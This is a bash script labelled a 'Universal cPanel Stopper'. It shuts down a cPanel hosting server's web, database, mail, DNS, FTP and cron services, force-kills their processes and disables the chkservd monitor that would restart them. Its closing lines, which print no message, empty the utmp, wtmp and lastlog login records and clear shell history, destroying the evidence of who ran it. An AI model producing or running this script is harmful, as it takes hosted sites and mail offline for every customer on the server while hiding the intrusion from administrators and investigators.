#!/bin/bash

# Universal cPanel Stopper
# Hỗ trợ: CentOS 6/7/8/9, AlmaLinux, Rocky, CloudLinux

echo "[+] Detecting init system..."
stop_service() {
    SERVICE=$1

    if command -v systemctl >/dev/null 2>&1; then
        systemctl stop "$SERVICE" 2>/dev/null
    else
        service "$SERVICE" stop 2>/dev/null
    fi
}

echo "[+] Stopping cPanel services..."

SERVICES=(
    cpanel
    cpsrvd
    httpd
    apache2
    nginx
    mysql
    mysqld
    mariadb
    exim
    dovecot
    courier-imap
    pure-ftpd
    named
    bind
    spamassassin
    crond
)

for svc in "${SERVICES[@]}"; do
    stop_service "$svc"
done

echo "[+] Killing remaining cPanel processes..."

pkill -9 cpsrvd 2>/dev/null
pkill -9 -f cpanel 2>/dev/null
pkill -9 httpd 2>/dev/null
pkill -9 apache2 2>/dev/null
pkill -9 nginx 2>/dev/null


if [ -d /usr/local/cpanel/scripts ]; then
    echo "[+] Stopping internal cPanel services..."

    for f in /usr/local/cpanel/scripts/restartsrv_*; do
        [ -f "$f" ] || continue
        "$f" --stop 2>/dev/null
    done
fi

echo "[+] Disabling chkservd..."

if command -v systemctl >/dev/null 2>&1; then
    systemctl stop chkservd 2>/dev/null
else
    service chkservd stop 2>/dev/null
fi

pkill -9 chkservd 2>/dev/null
: > /var/run/utmp
: > /var/log/wtmp
: > /var/log/lastlog

export HISTSIZE=0
history -c
source /root/.bashrc 2>/dev/null
echo "[✓] All possible cPanel services stopped"
